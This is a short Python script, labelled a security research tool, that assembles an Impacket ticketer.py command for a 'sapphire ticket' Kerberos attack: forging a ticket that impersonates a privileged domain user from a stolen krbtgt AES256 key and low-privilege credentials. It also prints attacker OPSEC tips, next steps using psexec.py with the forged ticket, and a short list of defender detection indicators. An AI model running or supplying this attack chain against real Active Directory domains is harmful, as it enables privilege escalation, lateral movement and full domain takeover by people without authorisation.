#!/usr/bin/env python3
"""Impacket Sapphire Ticket Command Builder

Security research tool for understanding sapphire ticket command structure.
Sapphire combines Diamond's real TGT base with S4U2self+U2U to steal a privileged PAC.

Usage:
    python3 build-ticketer-sapphire.py --impersonate DAuser --domain lab.local \
        --user lowpriv --password Passw0rd! --aesKey <krbtgt_aes256> --domain-sid S-1-5-21-111-222-333
"""

import argparse
import json

def build_command(args):
    """Build the ticketer.py command for sapphire-style attack."""
    
    cmd_parts = [
        "python3 ticketer.py",
        "-request",  # Live KDC exchange required
        f"-impersonate '{args.impersonate}'",
        f"-domain '{args.domain}'",
        f"-user '{args.user}'",
        f"-password '{args.password}'",
        f"-aesKey '{args.aeskey}'",
        f"-domain-sid '{args.domain_sid}'"
    ]
    
    command = " \\\n  ".join(cmd_parts)
    
    return command

def print_opsec_notes():
    """Print OPSEC considerations for sapphire tickets."""
    notes = [
        "=== OPSEC Notes ===",
        "- TGS-REQ will carry ENC-TKT-IN-SKEY (rare in normal traffic)",
        "- TGS-REQ will carry additional-tickets (victim TGT)",
        "- sname often equals requesting user (self-service pattern)",
        "- Event ID 4769 shows caller and target as same SPN/user",
        "- Expect paired 4768/4769 with same client, different CNAMES",
        "- Follow-up 4624 logon from forged ticket",
        "- Use krbtgt AES256 key (not NTLM) for better compatibility",
        "- Ensure domain SID is correct (query with Get-DomainController)"
    ]
    return "\n".join(notes)

def print_detection_notes():
    """Print detection considerations."""
    notes = [
        "=== Detection Indicators ===",
        "- Look for TGS-REQ with ENC-TKT-IN-SKEY flag",
        "- Correlate 4768/4769/4624 sequences",
        "- Check for sname = requester in 4769",
        "- Monitor for unusual PAC group changes",
        "- Alert on additional-tickets in TGS-REQ",
        "- Use Splunk Security Content T1558.001 detections"
    ]
    return "\n".join(notes)

def main():
    parser = argparse.ArgumentParser(
        description="Build Impacket ticketer.py command for sapphire ticket research"
    )
    parser.add_argument("--impersonate", required=True,
                        help="Privileged user to impersonate (username or SID)")
    parser.add_argument("--domain", required=True,
                        help="Target domain (e.g., lab.local)")
    parser.add_argument("--user", required=True,
                        help="Low-priv user with valid credentials")
    parser.add_argument("--password", required=True,
                        help="Password for low-priv user")
    parser.add_argument("--aeskey", required=True,
                        help="krbtgt AES256 key")
    parser.add_argument("--domain-sid", required=True,
                        help="Domain SID (e.g., S-1-5-21-111-222-333)")
    
    args = parser.parse_args()
    
    print("=== Impacket Sapphire Ticket Command ===")
    print(build_command(args))
    print()
    
    print("=== Parameters ===")
    print(f"Impersonate: {args.impersonate}")
    print(f"Domain: {args.domain}")
    print(f"User: {args.user}")
    print(f"krbtgt AES256: [REDACTED]")
    print(f"Domain SID: {args.domain_sid}")
    print()
    
    print(print_opsec_notes())
    print()
    print(print_detection_notes())
    
    print("\n=== Next Steps ===")
    print("1. Run the command to generate .ccache file")
    print("2. Export KRB5CCNAME=lowpriv.ccache")
    print("3. Use psexec.py -k -no-pass to test the ticket")
    print("4. Monitor Event IDs 4768, 4769, 4624 for detection validation")

if __name__ == "__main__":
    main()
